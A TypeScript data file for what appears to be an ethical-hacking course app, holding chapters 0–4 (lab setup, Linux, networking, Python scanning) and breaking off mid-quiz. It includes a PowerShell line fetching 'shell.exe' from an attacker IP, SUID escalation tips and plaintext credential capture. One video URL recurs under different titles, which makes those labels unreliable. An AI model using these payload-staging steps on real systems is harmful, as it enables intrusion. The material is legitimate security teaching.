export interface CodeSnippet {
  language: string;
  filename?: string;
  code: string;
  explanation?: string;
}

export interface ChapterSection {
  title: string;
  content: string;
  codeSnippets?: CodeSnippet[];
  callout?: {
    type: 'tip' | 'warning' | 'legal' | 'exploit';
    text: string;
  };
}

export interface LabCommand {
  cmd: string;
  desc: string;
  sampleOutput?: string;
}

export interface HandsOnLab {
  labTitle: string;
  objective: string;
  setupSteps: string[];
  commands: LabCommand[];
  expectedOutcome: string;
}

export interface VideoResource {
  title: string;
  url: string;
  platform: string;
  duration?: string;
}

export interface QuizQuestion {
  question: string;
  options: string[];
  answerIndex: number;
  explanation: string;
}

export interface Chapter {
  id: string;
  partId: string;
  partTitle: string;
  chapterNumber: number;
  title: string;
  subtitle: string;
  durationMinutes: number;
  xpReward: number;
  badgeName: string;
  badgeIcon: string;
  overview: string;
  keyLearningPoints: string[];
  sections: ChapterSection[];
  handsOnLab: HandsOnLab;
  verifiedVideos: VideoResource[];
  quiz: QuizQuestion[];
  cheatSheetHighlights?: Array<{ command: string; flagMeaning: string }>;
}

export interface BookPart {
  id: string;
  partNumber: number;
  title: string;
  subtitle: string;
  weeksSpan: string;
  description: string;
  chapterIds: string[];
}

export interface Appendix {
  id: string;
  letter: string;
  title: string;
  description: string;
  content: string;
  cheatData?: Array<{ category: string; commands: Array<{ syntax: string; description: string }> }>;
}

export interface BookMetadata {
  title: string;
  subtitle: string;
  author: string;
  authorBio: string;
  edition: string;
  releaseYear: number;
  totalChapters: number;
  totalLabs: number;
  totalQuizQuestions: number;
  suggestedPrice: number;
  currency: string;
}

export const BOOK_METADATA: BookMetadata = {
  title: "THE COMPLETE ETHICAL HACKER: Zero to Professional",
  subtitle: "A Hands-On Roadmap Using Kali Linux, Parrot OS, and Real-World Tools",
  author: "Chrishem",
  authorBio: "Offensive Security Specialist, Pentesting Instructor, and Cyber Systems Architect dedicated to practical, no-BS cybersecurity education.",
  edition: "2026 Masterclass Edition",
  releaseYear: 2026,
  totalChapters: 24,
  totalLabs: 24,
  totalQuizQuestions: 72,
  suggestedPrice: 49.00,
  currency: "USD"
};

export const BOOK_PARTS: BookPart[] = [
  {
    id: "part-0",
    partNumber: 0,
    title: "GETTING STARTED",
    subtitle: "Front Matter, Ethics & Lab Blueprint",
    weeksSpan: "Day 1",
    description: "Legal boundaries, ethical frameworks, authorized disclosure, and workstation architecture setup.",
    chapterIds: ["ch-0"]
  },
  {
    id: "part-1",
    partNumber: 1,
    title: "FOUNDATIONS",
    subtitle: "Core Operating Systems, Networks & Scripting",
    weeksSpan: "Weeks 1–4",
    description: "Deep dive into Linux internals, TCP/IP networking, Python automation, and offensive threat modeling.",
    chapterIds: ["ch-1", "ch-2", "ch-3", "ch-4", "ch-5"]
  },
  {
    id: "part-2",
    partNumber: 2,
    title: "CORE HACKING SKILLS",
    subtitle: "Recon, Exploitation & Attack Vectors",
    weeksSpan: "Weeks 5–12",
    description: "OSINT reconnaissance, Nmap network enumeration, vulnerability exploitation, hash cracking, OWASP web application testing, and wireless auditing.",
    chapterIds: ["ch-6", "ch-7", "ch-8", "ch-9", "ch-10", "ch-11", "ch-12", "ch-13", "ch-14"]
  },
  {
    id: "part-3",
    partNumber: 3,
    title: "ADVANCED OFFENSIVE SECURITY",
    subtitle: "PrivEsc, Active Directory & Modern Attack Surfaces",
    weeksSpan: "Weeks 13–20",
    description: "Linux/Windows privilege escalation, lateral pivoting, Kerberoasting Active Directory, payload crafting, mobile and cloud pentesting.",
    chapterIds: ["ch-15", "ch-16", "ch-17", "ch-18", "ch-19", "ch-20"]
  },
  {
    id: "part-4",
    partNumber: 4,
    title: "PROFESSIONAL LEVEL",
    subtitle: "Reporting, Certifications & Career Dominance",
    weeksSpan: "Weeks 21–26",
    description: "Executive report authoring, the 2026 certification roadmap (eJPT, PNPT, OSCP), freelancing client contracts, and the 90-day CTF grind plan.",
    chapterIds: ["ch-21", "ch-22", "ch-23", "ch-24"]
  }
];

export const CHAPTERS: Chapter[] = [
  {
    id: "ch-0",
    partId: "part-0",
    partTitle: "PART 0 — GETTING STARTED",
    chapterNumber: 0,
    title: "Front Matter & The Ethical Hacker's Creed",
    subtitle: "Legal frameworks, Scope Documents & Your Personal Lab Blueprint",
    durationMinutes: 20,
    xpReward: 150,
    badgeName: "Ethical Pledge",
    badgeIcon: "ShieldCheck",
    overview: "Before executing a single packet or script, every elite hacker understands the razor-thin boundary between professional penetration testing and criminal activity. In this orientation, Chrishem breaks down the golden rules of authorized engagement, the Computer Fraud and Abuse Act (CFAA), GDPR, and your physical lab hardware requirements.",
    keyLearningPoints: [
      "Understand written consent, Statements of Work (SOW), and Rules of Engagement (ROE).",
      "Legal implications under CFAA (USA), Computer Misuse Act 1990 (UK), and EU GDPR.",
      "Responsible Disclosure process vs 0-day extortion.",
      "Hardware requirements: 8GB+ RAM, 60GB free NVMe SSD, VirtualBox or VMware Workstation."
    ],
    sections: [
      {
        title: "The Golden Law: Written Authorization",
        content: `Welcome to the definitive training roadmap by Chrishem. In the world of cybersecurity, knowledge is an equalizer. The difference between a high-earning ethical penetration tester ($120k–$220k/yr) and a criminal facing felony prosecution comes down to a single document: **Explicit, written, verified authorization signed by the system owner**.

Never probe, ping, fuzz, or scan any IP, domain, or device that you do not personally own or have formal written permission (Rules of Engagement) to test. Cloud providers, colleges, coffee shop Wi-Fi, and work laptops are strictly off-limits without a counter-signed testing charter.`,
        callout: {
          type: "legal",
          text: "Disclaimer: This e-book is engineered exclusively for educational instruction, authorized penetration testing, security auditing, and defensive fortification. All techniques must only be practiced within your own isolated virtualization environments or official sandboxes like Hack The Box, TryHackMe, and PortSwigger Web Security Academy."
        }
      },
      {
        title: "Hardware & Virtualization Toolkit",
        content: `To complete all 24 labs in this masterclass, you will build an isolated private network on your host machine.

### Minimum Recommended Specs:
- **Processor:** 64-bit Quad-Core Intel i5/i7 or AMD Ryzen 5/7 (Apple Silicon M1/M2/M3 supported via UTM or VMware Fusion).
- **RAM:** 16GB RAM recommended (8GB minimum to run 1 host + 1 attacker VM + 1 target VM concurrently).
- **Storage:** 60GB to 100GB free high-speed SSD space.
- **Hypervisor:** VirtualBox (Free & Open Source) or VMware Workstation Pro (Free for personal use).
- **Wi-Fi Adapter (for Ch 12):** Alfa AWUS036ACH or Panda PAU09 with monitor mode and packet injection support.`,
        codeSnippets: [
          {
            language: "bash",
            filename: "verify_virtualization.sh",
            code: "# Check if CPU virtualization (VT-x / AMD-V) is enabled on Linux/WSL\negrep -c '(vmx|svm)' /proc/cpuinfo\n\n# On Windows PowerShell, verify Hyper-V or nested virtualization:\nGet-ComputerInfo -Property 'HyperV*'",
            explanation: "If the output count is greater than 0, hardware virtualization is enabled in your BIOS/UEFI."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 0: The Rules of Engagement Validation",
      objective: "Draft and audit a legally watertight Rules of Engagement document for a mock enterprise client.",
      setupSteps: [
        "Review the sample SOW and ROE template in Appendix D.",
        "Identify out-of-scope assets (e.g., third-party SaaS, production payment gateways, CEO executive workstations).",
        "Define emergency contacts, incident escalation procedures, and testing blackout windows (e.g., no heavy scans between 9 AM - 5 PM)."
      ],
      commands: [
        {
          cmd: "cat << 'EOF' > roe_verification.txt\nSCOPE: 192.168.56.0/24 (Host-Only Test Lab)\nOUT_OF_SCOPE: All upstream routers and cloud gateways\nTESTER: Chrishem Student Pentester\nAUTHORIZED_BY: Chief Information Security Officer\nEOF",
          desc: "Generate local lab authorization confirmation file",
          sampleOutput: "Created roe_verification.txt with restricted host-only lab scope."
        }
      ],
      expectedOutcome: "A structured, signed scope record ready before powering on any offensive tool."
    },
    verifiedVideos: [
      {
        title: "Cybersecurity Ethics & CFAA Legal Pitfalls",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube (Simplilearn Complete Course)",
        duration: "Full Course Overview"
      }
    ],
    quiz: [
      {
        question: "What is the single most critical requirement before initiating a penetration test against any external network?",
        options: [
          "Running an intensive Nmap stealth scan",
          "Written, explicit authorization and a signed Rules of Engagement (ROE)",
          "A verified VPN connection with DNS leak protection",
          "A commercial Burp Suite Professional license"
        ],
        answerIndex: 1,
        explanation: "Without written consent signed by the asset owner, any scanning or exploitation is illegal under laws such as the CFAA, regardless of your intention."
      },
      {
        question: "In standard virtualization for penetration testing labs, which network adapter mode keeps vulnerable target VMs completely isolated from the internet?",
        options: [
          "Bridged Networking",
          "Host-Only (or Isolated Internal Network)",
          "NAT with Port Forwarding",
          "Direct USB Passthrough"
        ],
        answerIndex: 1,
        explanation: "Host-Only networks restrict communications exclusively between the host machine and designated virtual machines, preventing accidental exposure of vulnerable labs to the public internet."
      }
    ]
  },
  {
    id: "ch-1",
    partId: "part-1",
    partTitle: "PART 1 — FOUNDATIONS",
    chapterNumber: 1,
    title: "Setting Up Your Hacking Lab",
    subtitle: "Kali Linux vs Parrot OS vs BlackArch & Vulnerable Targets",
    durationMinutes: 35,
    xpReward: 200,
    badgeName: "Lab Architect",
    badgeIcon: "Terminal",
    overview: "Every serious security researcher starts with an operational environment tailored for offensive testing. In this chapter, we evaluate Kali Linux, Parrot Security OS, and BlackArch, deploy your attacker virtual machine, and construct an isolated sandbox populated with Metasploitable 2 and DVWA.",
    keyLearningPoints: [
      "Compare Kali Linux (industry standard, offensive focus) vs Parrot OS (lightweight, privacy focus) vs BlackArch (arch-based, 2800+ tools).",
      "Deploy Kali Linux 2026 inside VirtualBox/VMware with Guest Additions.",
      "Configure Host-Only virtual networking for impenetrable sandboxing.",
      "Spin up vulnerable practice targets: Metasploitable 2, Metasploitable 3, and Damn Vulnerable Web App (DVWA)."
    ],
    sections: [
      {
        title: "Attacker Distro Showdown: Kali vs Parrot vs BlackArch",
        content: `Choosing the right offensive distro prevents endless configuration headaches:

| Feature | Kali Linux (OffSec) | Parrot OS (Security Edition) | BlackArch Linux |
| :--- | :--- | :--- | :--- |
| **Base** | Debian Testing | Debian Stable | Arch Linux |
| **Desktop Env** | XFCE (Sleek, low RAM) | MATE (Lightweight) | Fluxbox / Openbox |
| **Memory Footprint**| ~1.2 GB Idle | ~650 MB Idle | ~800 MB Idle |
| **Preinstalled Tools**| ~600 Curated | ~500 Curated | 2800+ (Massive) |
| **Out-of-box Anonymity**| Standard | Anonsurf + Tor Built-in | Manual Setup |
| **Industry Standard** | 92% of corporate pentests | Popular with privacy/devs | Specialized for Arch purists |

**Chrishem's Recommendation:** For this course and certification preparation (eJPT, OSCP), Kali Linux is the unmatched gold standard. Parrot OS is a stellar lightweight secondary option for low-spec laptops.`,
        callout: {
          type: "tip",
          text: "Always take a clean Virtual Machine Snapshot immediately after installing guest additions and running 'apt update && apt upgrade'. When a tool dependency breaks or you inadvertently poison a library, you can revert back in 5 seconds."
        }
      },
      {
        title: "Deploying Vulnerable Targets",
        content: `Never practice attacks against live systems. You will download two primary targets:
1. **Metasploitable 2**: A Linux VM deliberately misconfigured with over 20 critical vulnerabilities (FTP backdoors, Tomcat default creds, vulnerable NFS shares).
2. **Damn Vulnerable Web App (DVWA)**: A PHP/MySQL web application built with adjustable security levels (Low, Medium, High, Impossible) for practicing SQL Injection, XSS, and CSRF.`,
        codeSnippets: [
          {
            language: "bash",
            filename: "kali_initial_setup.sh",
            code: "# 1. Update repository catalogs and core tools\nsudo apt update && sudo apt -y full-upgrade\n\n# 2. Install essential pentesting utilities\nsudo apt install -y seclists curl wget git build-essential tmux jq\n\n# 3. Unpack Rockyou wordlist into place\nsudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || ls -la /usr/share/wordlists/rockyou.txt\n\n# 4. Verify network interfaces\nip a",
            explanation: "Unpacking rockyou.txt gives you instant access to 14.3 million plaintext passwords for upcoming cracking labs."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 1: Attacker & Target Ping Sweep Validation",
      objective: "Establish an isolated Host-Only subnet (192.168.56.0/24) and confirm bidirectional connectivity without internet leakage.",
      setupSteps: [
        "In VirtualBox Manager, create a Host-only network (vboxnet0) with DHCP enabled (IP: 192.168.56.1, Subnet: 255.255.255.0).",
        "Set Network Adapter 1 of Kali Linux to Host-Only.",
        "Set Network Adapter 1 of Metasploitable 2 to Host-Only.",
        "Boot both virtual machines and log into Metasploitable with credentials 'msfadmin' / 'msfadmin'."
      ],
      commands: [
        {
          cmd: "sudo fping -agq 192.168.56.0/24",
          desc: "Execute fast ICMP ping sweep to locate your vulnerable target IP",
          sampleOutput: "192.168.56.1\n192.168.56.101 (Kali)\n192.168.56.102 (Metasploitable 2 Target)"
        },
        {
          cmd: "nc -zv 192.168.56.102 21 22 80",
          desc: "Verify open listening ports on the target",
          sampleOutput: "Connection to 192.168.56.102 21 port [tcp/ftp] succeeded!\nConnection to 192.168.56.102 22 port [tcp/ssh] succeeded!\nConnection to 192.168.56.102 80 port [tcp/http] succeeded!"
        }
      ],
      expectedOutcome: "Kali successfully discovers the target IP (192.168.56.102) with core attack surfaces exposed."
    },
    verifiedVideos: [
      {
        title: "Kali Linux vs Parrot OS Explained (In-Depth)",
        url: "https://www.youtube.com/watch?v=_iLm-m-sDn8",
        platform: "YouTube (David Bombal / Verified)",
        duration: "24m"
      },
      {
        title: "Parrot OS Complete Master Playlist",
        url: "https://www.youtube.com/playlist?list=PLjVLYmrlmjGcu44UKR5WxHAIN-ndYuMyz",
        platform: "YouTube Playlist",
        duration: "Multi-part"
      }
    ],
    quiz: [
      {
        question: "Why should you immediately unpack '/usr/share/wordlists/rockyou.txt.gz' on a fresh Kali Linux installation?",
        options: [
          "It contains the root passwords for all Linux distributions",
          "It provides the primary 14.3 million password wordlist used for offline hash cracking and brute forcing",
          "It is required to boot the Kali Linux desktop environment",
          "It updates the Linux kernel with wireless driver patches"
        ],
        answerIndex: 1,
        explanation: "Kali ships with the industry-standard 'rockyou.txt' compressed as a .gz file. Unpacking it ensures tools like Hydra, John the Ripper, and Hashcat can immediately read the wordlist."
      },
      {
        question: "Which desktop environment is default on modern Kali Linux due to its fast responsiveness and low memory footprint?",
        options: [
          "GNOME 40",
          "KDE Plasma",
          "XFCE",
          "Cinnamon"
        ],
        answerIndex: 2,
        explanation: "Offensive Security transitioned Kali to XFCE to provide a lightweight, snappy desktop that conserves valuable RAM for memory-intensive tools."
      }
    ],
    cheatSheetHighlights: [
      { command: "sudo apt update && sudo apt -y full-upgrade", flagMeaning: "Synchronize catalog and perform full package upgrade" },
      { command: "fping -agq 192.168.56.0/24", flagMeaning: "-a show alive, -g generate range, -q quiet output" },
      { command: "ip -br a", flagMeaning: "Print brief table of IP addresses per interface" }
    ]
  },
  {
    id: "ch-2",
    partId: "part-1",
    partTitle: "PART 1 — FOUNDATIONS",
    chapterNumber: 2,
    title: "Linux Mastery for Hackers",
    subtitle: "Filesystem Hierarchy, SUID Permissions, Bash Scripting & Tmux",
    durationMinutes: 45,
    xpReward: 250,
    badgeName: "Bash Samurai",
    badgeIcon: "Code",
    overview: "Over 85% of servers, cloud containers, and enterprise workloads run on Linux. If you cannot navigate the terminal like breathing, you cannot hack effectively. In this chapter, Chrishem teaches you the underlying Linux architecture, permission manipulation, SUID exploitation vectors, and terminal multiplexing with Tmux.",
    keyLearningPoints: [
      "Navigate the Linux Filesystem Hierarchy (FHS): /etc, /var/log, /proc, /dev, /tmp.",
      "Master Octal & Symbolic permissions (rwx: 4, 2, 1) and special permissions (SUID=4000, SGID=2000, Sticky=1000).",
      "Process management, cron job scheduling, and systemd service creation.",
      "Terminal superpowers with tmux (splitting panes, persistent remote sessions)."
    ],
    sections: [
      {
        title: "The Linux Filesystem & Privilege Anatomy",
        content: `In Linux, everything is a file. Understanding where critical credentials and configurations live is the foundation of local enumeration:

- **/etc/passwd**: World-readable account registry. Contains username, UID, GID, home directory, and default shell.
- **/etc/shadow**: Root-readable hash file. Contains cryptographically salted password hashes.
- **/etc/sudoers**: Defines which users can execute commands as root (configured via \`visudo\`).
- **/var/log/**: System audit logs (auth.log, syslog, nginx/access.log) - crucial for verifying whether your attacks left traces.
- **/tmp & /dev/shm**: World-writable directories where you download exploit binaries and staging scripts.`,
        codeSnippets: [
          {
            language: "bash",
            filename: "suid_search.sh",
            code: "# Search for SUID binaries (runs with root permissions regardless of who executes it)\nfind / -perm -u=s -type f 2>/dev/null\n\n# Alternative octal search:\nfind / -perm -4000 -type f -exec ls -ld {} + 2>/dev/null",
            explanation: "If you find a non-standard SUID binary (such as find, vim, bash, or python), you can instantly escalate to root via GTFOBins!"
          }
        ]
      },
      {
        title: "Tmux: Never Lose a Remote Shell Again",
        content: `When you trigger an exploitation payload over SSH or Netcat, a dropped Wi-Fi connection will kill your shell unless it runs inside a multiplexer.

### Essential Tmux Hotkeys (Prefix is Ctrl+B):
- \`tmux new -s chrishem_lab\`: Start a named session.
- \`Ctrl+B\` then \`"\`: Split pane horizontally.
- \`Ctrl+B\` then \`%\`: Split pane vertically.
- \`Ctrl+B\` then arrow keys: Navigate between panes.
- \`Ctrl+B\` then \`d\`: Detach session (leaves all tools running in background).
- \`tmux attach -t chrishem_lab\`: Reattach anytime.`,
        callout: {
          type: "tip",
          text: "Practice OverTheWire Bandit (Levels 0 through 25). It is the world's most effective gamified training ground for Linux command line fluency."
        }
      }
    ],
    handsOnLab: {
      labTitle: "Lab 2: Automated SUID Audit & Bash Automation",
      objective: "Write an automated Bash triage script that inspects a host for misconfigured permissions, open cron jobs, and writable PATH directories.",
      setupSteps: [
        "Open a terminal in your Kali Linux VM.",
        "Create an executable script named 'lin_audit.sh'.",
        "Run the audit against your local machine and record findings."
      ],
      commands: [
        {
          cmd: "cat << 'EOF' > lin_audit.sh\n#!/usr/bin/env bash\necho '[+] --- CHRISHEM LINUX AUDIT ---'\necho '[*] Current User: ' $(whoami) ' (UID: ' $(id -u) ')'\necho '[*] Kernel Version: ' $(uname -r)\necho '[*] SUID Binaries Found:'\nfind / -perm -4000 -type f 2>/dev/null | head -n 10\necho '[*] Writable World Directories in PATH:'\nfor dir in $(echo $PATH | tr ':' ' '); do\n  if [ -w \"$dir\" ]; then echo \"[!] ALERT: $dir is writable!\"; fi\ndone\necho '[+] Audit Completed.'\nEOF\nchmod +x lin_audit.sh\n./lin_audit.sh",
          desc: "Assemble and execute the Linux security auditing script",
          sampleOutput: "[+] --- CHRISHEM LINUX AUDIT ---\n[*] Current User: kali (UID: 1000)\n[*] Kernel Version: 6.8.0-kali3-amd64\n[*] SUID Binaries Found:\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/passwd\n[+] Audit Completed."
        }
      ],
      expectedOutcome: "The script runs cleanly, filters standard error (2>/dev/null), and highlights potential privilege escalation vectors."
    },
    verifiedVideos: [
      {
        title: "OverTheWire Bandit Walkthrough (Complete Guide)",
        url: "https://overthewire.org",
        platform: "OverTheWire Lab Community",
        duration: "Levels 0-34"
      }
    ],
    quiz: [
      {
        question: "What does an SUID bit (chmod u+s /path/to/binary) do when applied to an executable file owned by root?",
        options: [
          "It encrypts the binary file on disk",
          "It forces any standard user executing the binary to run it with the permissions of the file owner (root)",
          "It makes the file inaccessible to non-root users",
          "It deletes the binary after single execution"
        ],
        answerIndex: 1,
        explanation: "SUID (Set Owner User ID up on execution) causes the process to run with the effective UID of the file's owner. If owned by root, unprivileged users execute it with root powers."
      },
      {
        question: "Which file contains the salted password hashes on a modern Linux distribution?",
        options: [
          "/etc/passwd",
          "/etc/hosts",
          "/etc/shadow",
          "/var/log/syslog"
        ],
        answerIndex: 2,
        explanation: "/etc/shadow stores the actual encrypted password hashes and password expiration metadata, restricted to root read permissions."
      }
    ],
    cheatSheetHighlights: [
      { command: "find / -perm -4000 -type f 2>/dev/null", flagMeaning: "Locate all files with SUID bit enabled" },
      { command: "grep -rnw '/var/log/' -e 'password'", flagMeaning: "Recursive search for plaintext passwords in logs" },
      { command: "chmod 4755 exploit_stub", flagMeaning: "Assign SUID bit (4) + rwxr-xr-x permissions" }
    ]
  },
  {
    id: "ch-3",
    partId: "part-1",
    partTitle: "PART 1 — FOUNDATIONS",
    chapterNumber: 3,
    title: "Networking Fundamentals for Pentesters",
    subtitle: "OSI vs TCP/IP, Subnetting, Routing, & Deep Wireshark Packet Dissection",
    durationMinutes: 40,
    xpReward: 200,
    badgeName: "Packet Whisperer",
    badgeIcon: "Network",
    overview: "You cannot exploit what you do not comprehend. Penetration testers do not just browse websites; they manipulate TCP flags, intercept ARP frames, dissect DNS queries, and inspect raw byte streams. In this chapter, you learn the mechanics of the 3-Way Handshake, TCP tear-down, subnet math, and Wireshark capture analysis.",
    keyLearningPoints: [
      "Map real-world attacks to OSI layers (Layer 2 MAC Flooding, Layer 3 IP Spoofing, Layer 4 SYN Flood, Layer 7 SQLi).",
      "Deconstruct the TCP 3-Way Handshake: SYN, SYN-ACK, ACK.",
      "Calculate CIDR subnets in your head (/24 = 254 hosts, /16 = 65,534 hosts).",
      "Deploy Wireshark capture filters (BPF) vs display filters to extract credentials from unencrypted protocols."
    ],
    sections: [
      {
        title: "The Anatomy of a TCP Connection",
        content: `When your attacker machine opens a reverse shell or sends an HTTP request, the operating system initiates the TCP 3-Way Handshake:

\`\`\`
Attacker (Client)                       Target (Server)
   |                                          |
   | -------- [SYN] Seq=1000 ---------------> | (Wants to synchronize)
   |                                          |
   | <------- [SYN-ACK] Seq=5000 Ack=1001 --- | (Acknowledges & synchs)
   |                                          |
   | -------- [ACK] Ack=5001 ---------------> | (Connection Established!)
   |                                          |
\`\`\`

**Offensive Insight:** An Nmap Stealth Scan (\`nmap -sS\`) sends a **SYN**. If the target returns **SYN-ACK**, the port is open! However, Nmap immediately sends an **RST** (Reset) packet instead of completing the final ACK. This leaves the connection half-open, avoiding standard application logging!`,
        callout: {
          type: "exploit",
          text: "Unencrypted protocols (HTTP port 80, FTP port 21, Telnet port 23, POP3 port 110) transmit usernames and passwords in raw plaintext across the wire. Anyone running Wireshark or Bettercap on the same broadcast domain can intercept them instantly."
        }
      },
      {
        title: "Wireshark Display Filter Cheatsheet",
        content: `When analyzing a 500MB packet capture (.pcap), raw browsing is impossible. Use targeted display filters:

- \`http.request.method == "POST"\`: Shows all web form submissions (often captures logins).
- \`tcp.flags.syn == 1 && tcp.flags.ack == 0\`: Isolates incoming connection requests and port scanning probes.
- \`ip.addr == 192.168.56.102 && tcp.port == 21\`: Pinpoints FTP communication with your target VM.
- \`dns.flags.response == 1\`: Filters resolved domain queries.`,
        codeSnippets: [
          {
            language: "bash",
            filename: "tshark_sniff.sh",
            code: "# Capture live traffic on eth0 without GUI using TShark\nsudo tshark -i eth0 -Y 'http.request or ftp' -T fields -e ip.src -e ip.dst -e http.request.full_uri",
            explanation: "TShark is the terminal counterpart to Wireshark, essential when testing over low-bandwidth SSH tunnels."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 3: Dissecting an Unencrypted FTP Authentication",
      objective: "Capture network traffic during a Telnet/FTP login against Metasploitable 2 and extract the plaintext password using Wireshark.",
      setupSteps: [
        "Launch Wireshark on Kali Linux and select your Host-Only adapter (e.g. eth0 / vboxnet0).",
        "Start capturing traffic.",
        "In a separate terminal, log into Metasploitable 2 via FTP using 'msfadmin' / 'msfadmin'."
      ],
      commands: [
        {
          cmd: "ftp 192.168.56.102\n# Enter 'msfadmin' for username\n# Enter 'msfadmin' for password\n# Type 'quit'",
          desc: "Initiate FTP connection to vulnerable target",
          sampleOutput: "Connected to 192.168.56.102.\n220 (vsFTPd 2.3.4)\nName (192.168.56.102:kali): msfadmin\n331 Please specify the password.\nPassword:\n230 Login successful.\nftp> quit\n221 Goodbye."
        }
      ],
      expectedOutcome: "In Wireshark, filter by 'ftp' and inspect the 'USER' and 'PASS' packets to reveal plaintext credentials."
    },
    verifiedVideos: [
      {
        title: "Wireshark Packet Analysis Masterclass",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube (Verified Cyber Series)",
        duration: "Module 3"
      }
    ],
    quiz: [
      {
        question: "How does an Nmap SYN Stealth Scan (-sS) determine a port is open without creating a full TCP connection?",
        options: [
          "It sends a UDP probe and waits for ICMP unreachable",
          "It completes the 3-way handshake and downloads the banner",
          "It sends a SYN packet, waits for a SYN-ACK response, and immediately responds with an RST packet",
          "It guesses based on operating system fingerprinting"
        ],
        answerIndex: 2,
        explanation: "By sending an RST right after receiving SYN-ACK, Nmap tears down the connection before the application layer establishes an active session, making the scan stealthier and faster."
      },
      {
        question: "Which Wireshark filter will show only HTTP POST requests that may contain submitted passwords?",
        options: [
          "ip.proto == 6",
          "http.request.method == \"POST\"",
          "tcp.port == 443",
          "udp.length > 100"
        ],
        answerIndex: 1,
        explanation: "Filtering by http.request.method == 'POST' specifically isolates form submissions, authentication payloads, and API requests."
      }
    ],
    cheatSheetHighlights: [
      { command: "tcpdump -i eth0 -nn -s0 -w capture.pcap", flagMeaning: "Capture all packets on eth0 and write to pcap" },
      { command: "tshark -r capture.pcap -Y 'http' -x", flagMeaning: "Read pcap file, filter HTTP and display raw hex/ASCII" }
    ]
  },
  {
    id: "ch-4",
    partId: "part-1",
    partTitle: "PART 1 — FOUNDATIONS",
    chapterNumber: 4,
    title: "Programming for Hackers",
    subtitle: "Python (Sockets, Requests, Scapy), Bash Automation & PowerShell",
    durationMinutes: 50,
    xpReward: 250,
    badgeName: "Script Kiddie to Dev",
    badgeIcon: "Code",
    overview: "Anyone can download public exploits from GitHub. Elite hackers write their own tooling when prebuilt software fails. In this chapter, Chrishem teaches you Python for security: network socket programming, crafting custom HTTP attack scripts, packet manipulation with Scapy, and PowerShell fundamentals for Windows reconnaissance.",
    keyLearningPoints: [
      "Build a multi-threaded TCP Port Scanner in pure Python using socket.",
      "Automate web attacks and brute-force forms using the Python 'requests' library.",
      "Craft customized raw network frames using Scapy (ARP poisoning & SYN probing).",
      "Execute essential PowerShell one-liners for Windows post-exploitation reconnaissance."
    ],
    sections: [
      {
        title: "Building Your Own Multi-Threaded Port Scanner",
        content: `Nmap is incredible, but on restricted client environments where installing external binaries is prohibited, having a native Python port scanner in your back pocket is pure gold.

Here is the clean, high-performance port scanner script crafted by Chrishem:`,
        codeSnippets: [
          {
            language: "python",
            filename: "chrishem_portscanner.py",
            code: `#!/usr/bin/env python3
import socket
import sys
from concurrent.futures import ThreadPoolExecutor

def scan_port(target_ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        result = s.connect_ex((target_ip, port))
        if result == 0:
            try:
                # Banner grab
                s.send(b"HEAD / HTTP/1.1\\r\\n\\r\\n")
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip().split('\\n')[0]
                print(f"[+] Port {port:5d}/tcp is OPEN | Banner: {banner}")
            except:
                print(f"[+] Port {port:5d}/tcp is OPEN")
        s.close()
    except Exception:
        pass

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 chrishem_portscanner.py <TARGET_IP> [MAX_PORT]")
        sys.exit(1)
    
    target = sys.argv[1]
    max_port = int(sys.argv[2]) if len(sys.argv) > 2 else 1024
    print(f"[*] Scanning {target} (Ports 1-{max_port}) with 100 threads...")
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        for p in range(1, max_port + 1):
            executor.submit(scan_port, target, p)

if __name__ == "__main__":
    main()`,
            explanation: "ThreadPoolExecutor spawns 100 concurrent workers, scanning 1024 ports in under 3 seconds using native standard libraries!"
          }
        ]
      },
      {
        title: "PowerShell for Windows Recon",
        content: `Windows environments lack Bash by default, but modern Windows contains PowerShell. Learn these essential post-exploitation commands:

- \`Get-Service | Where-Object {$_.Status -eq "Running"}\`: Enumerate active Windows services.
- \`Get-NetIPAddress | Format-Table -AutoSize\`: List all network adapters and internal subnets.
- \`Get-Process | Sort-Object CPU -Descending | Select-Object -First 10\`: Inspect resource-heavy processes (frequently security agents or database engines).
- \`Invoke-WebRequest -Uri "http://10.10.14.5/shell.exe" -OutFile "$env:TEMP\\shell.exe"\`: Download attacker staging payloads directly into disk.`,
        callout: {
          type: "tip",
          text: "Never hardcode passwords or sensitive IP addresses directly in your Python code. Use environment variables (os.environ) or argparsers for clean operational security (OPSEC)."
        }
      }
    ],
    handsOnLab: {
      labTitle: "Lab 4: Run Your Python Scanner Against Metasploitable 2",
      objective: "Deploy your Python script and compare its discovered open ports and speed against a native Nmap scan.",
      setupSteps: [
        "Save the 'chrishem_portscanner.py' code in Kali Linux.",
        "Ensure Python 3 is installed ('python3 --version').",
        "Make it executable: 'chmod +x chrishem_portscanner.py'."
      ],
      commands: [
        {
          cmd: "python3 chrishem_portscanner.py 192.168.56.102 100",
          desc: "Run Python multithreaded scanner on common ports 1-100",
          sampleOutput: "[*] Scanning 192.168.56.102 (Ports 1-100) with 100 threads...\n[+] Port    21/tcp is OPEN | Banner: 220 (vsFTPd 2.3.4)\n[+] Port    22/tcp is OPEN | Banner: SSH-2.0-OpenSSH_4.7p1\n[+] Port    23/tcp is OPEN\n[+] Port    25/tcp is OPEN\n[+] Port    53/tcp is OPEN\n[+] Port    80/tcp is OPEN | Banner: HTTP/1.1 200 OK"
        }
      ],
      expectedOutcome: "The script outputs open ports and banner details in under 2 seconds."
    },
    verifiedVideos: [
      {
        title: "Python for Ethical Hackers: Full Beginner to Scripting Course",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube",
        duration: "1h 45m"
      }
    ],
    quiz: [
      {
        question: "In Python's socket library, what does socket.connect_ex((ip, port)) return when a port is open?",
        options: [
          "0",
          "1",
          "-1",
          "True"
        ],
        answerIndex: 0,
        explanation: "connect_ex returns 0 on success (port open) and an error code errno (e.g. 111 Connection Refused) if the port is closed, eliminating exception handling overhead."
      },
      {
        question: "Which Python library is specifically designed for low-level packet crafting, sniffing, and protocol manipulation?",
        options: [
